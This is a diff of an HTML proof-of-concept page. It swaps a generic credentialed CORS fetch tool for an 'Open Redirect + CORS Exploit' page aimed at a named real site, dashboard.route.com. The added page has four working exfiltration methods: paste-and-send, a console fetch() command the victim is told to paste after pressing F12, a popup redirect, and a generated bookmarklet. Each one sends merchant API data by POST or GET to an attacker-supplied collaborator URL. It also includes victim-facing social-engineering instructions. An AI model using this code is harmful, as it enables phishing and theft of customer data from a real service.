@@ -1,531 +1,411 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS PoC Exploit</title>
+    <title>CORS PoC - Open Redirect Exploit</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #d32f2f;
+            margin-top: 0;
+        }
+        .critical {
+            background: #ffebee;
+            border-left: 4px solid #d32f2f;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .success {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #b71c1c;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px 0;
+            font-weight: bold;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
             box-sizing: border-box;
         }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0f1115 0%, #1a1f2e 100%);
-            color: #eaeaea;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            background: rgba(22, 26, 32, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-            box-shadow: 
-                0 20px 40px rgba(0, 0, 0, 0.5),
-                0 0 0 1px rgba(255, 255, 255, 0.05),
-                0 0 60px rgba(0, 255, 204, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            overflow: hidden;
-        }
-
-        .header {
-            padding: 30px 40px;
-            background: linear-gradient(90deg, rgba(0, 255, 204, 0.1) 0%, transparent 100%);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        h1 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #00ffcc;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-        }
-
-        .subtitle {
-            font-size: 14px;
-            color: #888;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .subtitle a {
-            color: #4da3ff;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .subtitle a:hover {
-            color: #00ffcc;
-        }
-
-        .content {
-            padding: 30px 40px;
-        }
-
-        .input-group {
-            margin-bottom: 24px;
-        }
-
-        .label {
-            display: block;
-            font-size: 14px;
-            color: #888;
-            margin-bottom: 8px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .input-wrapper {
-            position: relative;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 14px 16px 14px 50px;
-            font-size: 15px;
-            border-radius: 10px;
-            border: 2px solid rgba(255, 255, 255, 0.05);
-            background: rgba(11, 14, 19, 0.8);
-            color: #eaeaea;
-            transition: all 0.3s ease;
-        }
-
-        input[type="text"]:focus {
-            outline: none;
-            border-color: #00ffcc;
-            background: rgba(11, 14, 19, 1);
-            box-shadow: 0 0 0 4px rgba(0, 255, 204, 0.1);
-        }
-
-        .input-icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #666;
-            font-size: 18px;
-        }
-
-        .controls {
-            display: flex;
-            gap: 16px;
-            margin: 24px 0;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 12px 24px;
-            font-size: 15px;
-            font-weight: 600;
-            background: linear-gradient(135deg, #00ffcc 0%, #00d4aa 100%);
-            color: #0f1115;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 12px rgba(0, 255, 204, 0.2);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 255, 204, 0.3);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .toggle-group {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: rgba(42, 47, 58, 0.5);
-            padding: 8px 16px;
-            border-radius: 10px;
-        }
-
-        .toggle-label {
-            font-size: 14px;
-            color: #aaa;
-            font-weight: 500;
-        }
-
-        .toggle-switch {
-            position: relative;
-            width: 50px;
-            height: 26px;
-        }
-
-        .toggle-switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .toggle-slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(42, 47, 58, 0.8);
-            transition: .4s;
-            border-radius: 34px;
-        }
-
-        .toggle-slider:before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 4px;
-            bottom: 4px;
-            background-color: #0f1115;
-            transition: .4s;
-            border-radius: 50%;
-        }
-
-        input:checked + .toggle-slider {
-            background-color: #00ffcc;
-        }
-
-        input:checked + .toggle-slider:before {
-            transform: translateX(24px);
-        }
-
-        .output-section {
-            margin-top: 32px;
-        }
-
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-
-        .section-title {
-            font-size: 16px;
-            color: #888;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .status-badge {
-            padding: 4px 12px;
-            border-radius: 20px;
+        textarea {
+            min-height: 150px;
+            font-family: monospace;
             font-size: 12px;
-            font-weight: 600;
-            background: rgba(42, 47, 58, 0.5);
         }
-
-        .status-idle {
-            color: #888;
+        .code {
+            background: #2d2d2d;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 13px;
+            margin: 10px 0;
+            cursor: pointer;
+            overflow-x: auto;
         }
-
-        .status-loading {
-            color: #00ffcc;
-            animation: pulse 1.5s infinite;
+        .code:hover {
+            background: #3d3d3d;
         }
-
-        .status-success {
-            color: #4ade80;
-        }
-
-        .status-error {
-            color: #f87171;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .output-area {
-            background: rgba(11, 14, 19, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
+        .method {
+            background: #f8f9fa;
             padding: 20px;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 14px;
-            line-height: 1.6;
-            min-height: 300px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            color: #eaeaea;
-            transition: all 0.3s ease;
+            margin: 15px 0;
+            border-left: 4px solid #d32f2f;
         }
-
-        .output-area:focus {
-            outline: none;
-            border-color: #00ffcc;
-            box-shadow: 0 0 0 4px rgba(0, 255, 204, 0.1);
+        .method h3 {
+            margin-top: 0;
+            color: #d32f2f;
         }
-
-        .output-area.json {
-            color: #eaeaea;
-        }
-
-        .output-area.json .key {
-            color: #4da3ff;
-        }
-
-        .output-area.json .string {
-            color: #a5d6ff;
-        }
-
-        .output-area.json .number {
-            color: #f87171;
-        }
-
-        .output-area.json .boolean {
-            color: #4ade80;
-        }
-
-        .output-area.json .null {
-            color: #fbbf24;
-        }
-
-        .output-area.json .brace, .output-area.json .bracket {
-            color: #eaeaea;
-        }
-
-        .empty-state {
-            color: #666;
-            font-style: italic;
-            text-align: center;
-            padding: 60px 20px;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                margin: 0;
-                border-radius: 0;
-                min-height: 100vh;
-            }
-
-            .header, .content {
-                padding: 20px;
-            }
-
-            h1 {
-                font-size: 24px;
-            }
-
-            .controls {
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .toggle-group {
-                justify-content: center;
-            }
+        .info {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>CORS PoC Exploit</h1>
-            <div class="subtitle">
-                Created by <a href="https://m.youtube.com/@lostsec_vip" target="_blank">@Coffin</a>
-            </div>
+        <h1>🔥 Open Redirect + CORS Exploit</h1>
+        
+        <div class="critical">
+            <strong>⚠️ CRITICAL FINDING!</strong><br>
+            Open Redirect discovered: <code>https://dashboard.route.com/login?returnTo=</code><br>
+            Combined with CORS vulnerability = Full exploitation chain!
         </div>
         
-        <div class="content">
-            <div class="input-group">
-                <label class="label">Target URL</label>
-                <div class="input-wrapper">
-                    <span class="input-icon">🔗</span>
-                    <input 
-                        type="text" 
-                        id="targetUrl" 
-                        placeholder="https://target.com/api/endpoint"
-                        autocomplete="off"
-                    >
-                </div>
-            </div>
+        <label>Your Collaborator URL (Attacker Server):</label>
+        <input type="text" id="collab" placeholder="https://your-id.burpcollaborator.net">
+    </div>
 
-            <div class="controls">
-                <button 
-                    id="fetchBtn" 
-                    class="btn" 
-                    onclick="exploitCORS()"
-                >
-                    <span>🚀</span>
-                    Fetch
-                </button>
-
-                <div class="toggle-group">
-                    <span class="toggle-label">Format:</span>
-                    <label class="toggle-switch">
-                        <input type="checkbox" id="formatToggle" onchange="renderOutput()">
-                        <span class="toggle-slider"></span>
-                    </label>
-                    <span class="toggle-label" id="formatLabel">Raw</span>
+    <!-- Method 1: Direct Redirect (Automatic!) -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 1: One-Click Automatic Redirect</h3>
+            <p><strong>How it works:</strong></p>
+            <ol style="margin: 10px 0;">
+                <li>Victim clicks button below</li>
+                <li>Redirects to: <code>dashboard.route.com/login?returnTo=/api/mn/v1/stores</code></li>
+                <li>Route.com automatically redirects to API endpoint (with cookies!)</li>
+                <li>Victim sees merchant data</li>
+                <li>Victim returns here and pastes data</li>
+            </ol>
+            
+            <button onclick="method1_redirect()">🚀 EXECUTE ONE-CLICK ATTACK</button>
+            
+            <div id="return-area" style="display:none;margin-top:15px;">
+                <div class="success">
+                    <strong>Welcome back!</strong><br>
+                    You were redirected to the API and saw the merchant data.<br>
+                    Now paste it below to complete the exfiltration:
                 </div>
-            </div>
-
-            <div class="output-section">
-                <div class="section-header">
-                    <span class="section-title">Response Output</span>
-                    <span class="status-badge status-idle" id="statusBadge">Idle</span>
-                </div>
-                <pre class="output-area" id="fetchedResource">
-                    <div class="empty-state">Waiting for request...</div>
-                </pre>
+                <label>Paste the API data here:</label>
+                <textarea id="paste-data" placeholder="Paste the JSON data here..."></textarea>
+                <button onclick="submitData()">📤 SEND TO ATTACKER</button>
             </div>
         </div>
     </div>
 
-    <script>
-        let lastResponse = "";
-        let isLoading = false;
-
-        function updateStatus(status) {
-            const badge = document.getElementById('statusBadge');
-            badge.className = 'status-badge status-' + status;
+    <!-- Method 2: Open in Popup -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 2: Open Redirect in Popup</h3>
+            <p><strong>How it works:</strong></p>
+            <ol style="margin: 10px 0;">
+                <li>Opens open redirect URL in popup</li>
+                <li>Popup automatically redirects to API</li>
+                <li>Cookies sent (same-origin redirect!)</li>
+                <li>Data visible in popup</li>
+            </ol>
             
-            switch(status) {
-                case 'idle':
-                    badge.textContent = 'Idle';
-                    break;
-                case 'loading':
-                    badge.textContent = 'Loading...';
-                    break;
-                case 'success':
-                    badge.textContent = 'Success';
-                    break;
-                case 'error':
-                    badge.textContent = 'Error';
-                    break;
-            }
-        }
+            <button onclick="method2_popup()">🎯 OPEN REDIRECT IN POPUP</button>
+        </div>
+    </div>
 
-        function exploitCORS() {
-            const url = document.getElementById("targetUrl").value.trim();
-            if (!url) {
-                showNotification('Please enter a target URL', 'error');
+    <!-- Method 3: Chain with Console Command -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 3: Auto-Redirect + Console Injection</h3>
+            <p><strong>Most realistic attacker scenario:</strong></p>
+            <ol style="margin: 10px 0;">
+                <li>Redirect victim to open redirect URL</li>
+                <li>Automatic redirect to API (with cookies!)</li>
+                <li>Victim presses F12 and pastes command</li>
+                <li>Data automatically sent to attacker!</li>
+            </ol>
+            
+            <button onclick="method3_console()">⚡ REDIRECT + CONSOLE METHOD</button>
+            
+            <div id="console-instructions" style="display:none;margin-top:15px;">
+                <div class="info">
+                    <strong>Instructions after redirect:</strong><br>
+                    1. You'll be redirected to the API page<br>
+                    2. Press <code>F12</code> to open console<br>
+                    3. Paste this command and press Enter:
+                </div>
+                <div class="code" id="console-code" onclick="copyCode()">
+                    Loading...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Method 4: Bookmarklet with Open Redirect -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 4: Bookmarklet (Use after redirect)</h3>
+            <p><strong>One-time setup, then fully automatic:</strong></p>
+            <ol style="margin: 10px 0;">
+                <li>Victim drags bookmarklet to bookmarks</li>
+                <li>Victim is redirected via open redirect</li>
+                <li>Victim clicks bookmarklet</li>
+                <li>Data automatically sent to attacker!</li>
+            </ol>
+            
+            <button onclick="generateBookmarklet()">📌 GENERATE BOOKMARKLET</button>
+            
+            <div id="bookmarklet-area" style="display:none;margin-top:15px;">
+                <div class="info">
+                    <strong>Drag this button to your bookmarks bar:</strong>
+                </div>
+                <a href="#" id="bookmarklet-link" style="display:inline-block;padding:12px 20px;background:#d32f2f;color:white;text-decoration:none;border-radius:4px;margin:10px 0;font-weight:bold;">
+                    📤 Exfiltrate to Attacker
+                </a>
+                <p style="margin-top:15px;"><strong>Then:</strong> Navigate to API via open redirect and click the bookmarklet!</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Technical Details -->
+    <div class="container">
+        <h2>🔍 Technical Details</h2>
+        
+        <div class="info">
+            <strong>Open Redirect URL:</strong><br>
+            <code>https://dashboard.route.com/login?returnTo=/api/mn/v1/stores</code>
+            
+            <br><br><strong>Why this is critical:</strong>
+            <ul style="margin: 10px 0;">
+                <li>✅ Redirect happens on route.com (same-origin)</li>
+                <li>✅ Cookies ARE sent (no SameSite issues!)</li>
+                <li>✅ Automatic redirect (no user interaction)</li>
+                <li>✅ Can be used in phishing/social engineering</li>
+                <li>✅ Chains perfectly with CORS vulnerability</li>
+            </ul>
+            
+            <br><strong>Attack Chain:</strong>
+            <ol style="margin: 10px 0;">
+                <li>CORS misconfiguration on API endpoint</li>
+                <li>Open redirect on login page</li>
+                <li>SameSite=Lax bypass via redirect</li>
+                <li>Complete data exfiltration</li>
+            </ol>
+            
+            <br><strong>CVSS Score:</strong> <span style="color:#d32f2f;font-weight:bold;">8.5 HIGH</span> (Chain of vulnerabilities)
+        </div>
+    </div>
+
+    <script>
+        var OPEN_REDIRECT_URL = 'https://dashboard.route.com/login?returnTo=/api/mn/v1/stores';
+        var API_URL = 'https://dashboard.route.com/api/mn/v1/stores';
+
+        // Method 1: Direct redirect with return
+        function method1_redirect() {
+            var collab = document.getElementById('collab').value.trim();
+            if (!collab || !collab.startsWith('http')) {
+                alert('⚠️ Please enter your collaborator URL first!');
                 return;
             }
 
-            const fetchBtn = document.getElementById('fetchBtn');
-            fetchBtn.disabled = true;
-            isLoading = true;
-            updateStatus('loading');
+            // Save state
+            localStorage.setItem('attack_mode', 'redirect_return');
+            localStorage.setItem('attacker_collab', collab);
+            localStorage.setItem('attack_time', Date.now());
 
-            const req = new XMLHttpRequest();
-            req.withCredentials = true;
+            alert('🚀 Launching Attack!\n\n' +
+                  'You will be redirected to Route.com login page.\n' +
+                  'It will automatically redirect to the API endpoint.\n\n' +
+                  'Copy ALL the text (Ctrl+A, Ctrl+C), then use your browser BACK button to return here.\n\n' +
+                  'Ready?');
 
-            req.onload = function () {
-                lastResponse = this.responseText;
-                isLoading = false;
-                fetchBtn.disabled = false;
-                updateStatus('success');
-                renderOutput();
-            };
-
-            req.onerror = function () {
-                isLoading = false;
-                fetchBtn.disabled = false;
-                updateStatus('error');
-                document.getElementById("fetchedResource").innerHTML = 
-                    '<div class="empty-state">Request failed or blocked by the browser.</div>';
-            };
-
-            req.open("GET", url, true);
-            req.send();
+            // Redirect to open redirect URL
+            setTimeout(function() {
+                window.location.href = OPEN_REDIRECT_URL;
+            }, 1000);
         }
 
-        function renderOutput() {
-            const output = document.getElementById("fetchedResource");
-            const isJSON = document.getElementById("formatToggle").checked;
-            const formatLabel = document.getElementById("formatLabel");
-
-            if (!lastResponse) {
-                output.innerHTML = '<div class="empty-state">No response available.</div>';
-                return;
-            }
-
-            if (!isJSON) {
-                output.textContent = lastResponse;
-                output.className = 'output-area';
-                formatLabel.textContent = 'Raw';
-                return;
-            }
-
-            try {
-                const parsed = JSON.parse(lastResponse);
-                output.innerHTML = syntaxHighlight(JSON.stringify(parsed, null, 2));
-                output.className = 'output-area json';
-                formatLabel.textContent = 'JSON';
-            } catch {
-                output.innerHTML = '<div class="empty-state">Response is not valid JSON.</div>' + 
-                                 '<br><br>' + escapeHtml(lastResponse);
-                output.className = 'output-area';
-                formatLabel.textContent = 'Raw';
-            }
-        }
-
-        function syntaxHighlight(json) {
-            json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-            return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g, function(match) {
-                let cls = 'number';
-                if (/^"/.test(match)) {
-                    if (/:$/.test(match)) {
-                        cls = 'key';
-                    } else {
-                        cls = 'string';
-                    }
-                } else if (/true|false/.test(match)) {
-                    cls = 'boolean';
-                } else if (/null/.test(match)) {
-                    cls = 'null';
+        // Check if returning from redirect
+        if (localStorage.getItem('attack_mode') === 'redirect_return') {
+            var attackTime = parseInt(localStorage.getItem('attack_time'));
+            var timeDiff = Date.now() - attackTime;
+            
+            // If returned within 5 minutes
+            if (timeDiff < 300000) {
+                localStorage.removeItem('attack_mode');
+                var collab = localStorage.getItem('attacker_collab');
+                if (collab) {
+                    document.getElementById('collab').value = collab;
                 }
-                return '<span class="' + cls + '">' + match + '</span>';
+                
+                document.getElementById('return-area').style.display = 'block';
+                document.getElementById('return-area').scrollIntoView({behavior: 'smooth'});
+                
+                alert('✅ Welcome back!\n\nPaste the API data below to complete the attack.');
+            }
+        }
+
+        function submitData() {
+            var data = document.getElementById('paste-data').value.trim();
+            var collab = document.getElementById('collab').value.trim();
+
+            if (!data) {
+                alert('⚠️ Please paste the data first!');
+                return;
+            }
+
+            // Validate JSON
+            try {
+                JSON.parse(data);
+            } catch(e) {
+                alert('⚠️ Invalid JSON! Make sure you copied ALL the text from the API page.');
+                return;
+            }
+
+            // Send to attacker
+            fetch(collab, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: data
+            });
+
+            fetch(collab + '?method=open_redirect&data=' + encodeURIComponent(data.substring(0, 2000)), {
+                mode: 'no-cors'
+            });
+
+            new Image().src = collab + '/img?attack=open_redirect&size=' + data.length;
+
+            alert('✅ SUCCESS!\n\n' +
+                  'Data exfiltrated to attacker:\n' +
+                  collab + '\n\n' +
+                  'Size: ' + data.length + ' bytes\n\n' +
+                  'Check your Burp Collaborator!');
+
+            document.getElementById('paste-data').value = '';
+            document.getElementById('return-area').style.display = 'none';
+            localStorage.clear();
+        }
+
+        // Method 2: Popup
+        function method2_popup() {
+            var popup = window.open(OPEN_REDIRECT_URL, 'redirect_popup', 'width=900,height=600');
+            
+            if (!popup) {
+                alert('⚠️ Popup blocked! Please allow popups and try again.');
+                return;
+            }
+
+            alert('✅ Popup Opened!\n\n' +
+                  'The popup will automatically redirect to the API endpoint.\n\n' +
+                  'You\'ll see the merchant data in the popup window.\n\n' +
+                  'This proves:\n' +
+                  '- Open redirect works ✓\n' +
+                  '- Cookies are sent ✓\n' +
+                  '- Data is accessible ✓');
+        }
+
+        // Method 3: Console command
+        function method3_console() {
+            var collab = document.getElementById('collab').value.trim();
+            if (!collab || !collab.startsWith('http')) {
+                alert('⚠️ Please enter your collaborator URL first!');
+                return;
+            }
+
+            // Generate console command
+            var command = `fetch('${collab}',{method:'POST',mode:'no-cors',body:document.body.innerText}).then(()=>alert('✅ Data sent to attacker: ${collab}'));`;
+            
+            document.getElementById('console-code').textContent = command;
+            document.getElementById('console-instructions').style.display = 'block';
+
+            alert('🎯 Instructions:\n\n' +
+                  '1. This will redirect you to the API via open redirect\n' +
+                  '2. After redirect, press F12\n' +
+                  '3. Copy the command shown below\n' +
+                  '4. Paste in console and press Enter\n' +
+                  '5. Data automatically sent to attacker!\n\n' +
+                  'Ready?');
+
+            setTimeout(function() {
+                window.location.href = OPEN_REDIRECT_URL;
+            }, 3000);
+        }
+
+        // Method 4: Bookmarklet
+        function generateBookmarklet() {
+            var collab = document.getElementById('collab').value.trim();
+            if (!collab || !collab.startsWith('http')) {
+                alert('⚠️ Please enter your collaborator URL first!');
+                return;
+            }
+
+            var bookmarkletCode = `javascript:(function(){var d=document.body.innerText;fetch('${collab}',{method:'POST',mode:'no-cors',body:d});fetch('${collab}?data='+encodeURIComponent(d.substring(0,2000)),{mode:'no-cors'});alert('✅ Data sent to attacker:\\n${collab}');})();`;
+            
+            document.getElementById('bookmarklet-link').href = bookmarkletCode;
+            document.getElementById('bookmarklet-area').style.display = 'block';
+
+            alert('📌 Bookmarklet Generated!\n\n' +
+                  '1. Drag the red button below to your bookmarks bar\n' +
+                  '2. Navigate to the API via open redirect\n' +
+                  '3. Click the bookmarklet\n' +
+                  '4. Data automatically sent to attacker!');
+        }
+
+        function copyCode() {
+            var code = document.getElementById('console-code').textContent;
+            navigator.clipboard.writeText(code).then(function() {
+                var elem = document.getElementById('console-code');
+                elem.style.background = '#1a5f1a';
+                elem.textContent = '✅ COPIED! Paste in console after redirect.';
+                setTimeout(function() {
+                    elem.style.background = '#2d2d2d';
+                    elem.textContent = code;
+                }, 3000);
             });
         }
-
-        function escapeHtml(text) {
-            const map = {
-                '&': '&amp;',
-                '<': '&lt;',
-                '>': '&gt;',
-                '"': '&quot;',
-                "'": '&#039;'
-            };
-            return text.replace(/[&<>"']/g, m => map[m]);
-        }
-
-        function showNotification(message, type) {
-            const output = document.getElementById("fetchedResource");
-            output.innerHTML = `<div class="empty-state" style="color: ${type === 'error' ? '#f87171' : '#4ade80'}">${message}</div>`;
-        }
-
-        // Initialize
-        document.getElementById('formatToggle').checked = false;
     </script>
 </body>
 </html>
